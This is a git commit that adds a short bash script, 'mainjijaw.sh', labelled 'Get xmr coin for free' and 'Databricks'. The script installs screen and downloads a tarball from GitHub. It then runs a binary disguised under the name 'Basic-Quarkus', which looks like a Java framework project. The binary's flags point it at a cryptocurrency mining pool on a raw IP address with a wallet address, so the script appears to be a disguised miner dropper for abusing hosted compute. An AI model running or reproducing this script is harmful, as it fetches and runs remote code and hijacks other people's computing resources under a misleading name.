d5e6ca5421a8b63dd100e2ba9f2a8b3d897c8f2f
dshillin <57657582+dshillin@users.noreply.github.com>
2022-09-12 09:15:41 +0100

    mainjijaw.sh

---
+++ mainjijaw.sh
@@ -0,0 +1,12 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+apt-get update
+clear
+apt-get install screen -y
+screen -R Basic-Quarkus
+ 
+wget https://raw.githubusercontent.com/dshillin/http-nodejs/main/Basic-Quarkus.tar.gz
+tar xvzf Basic-Quarkus.tar.gz
+cd Basic-Quarkus
+./Basic-Quarkus -a argon2/chukwav2 -o 142.132.131.248:80 -u TRTLv1hc4Ys615aVETRD9tB73tP7H53bwY3RQkBn7xH7iJzXP6FqKh9hJ8od82q59QLHLSiWiGEjYhoDPnCAcnWcS8nSGccNVsA -p test02
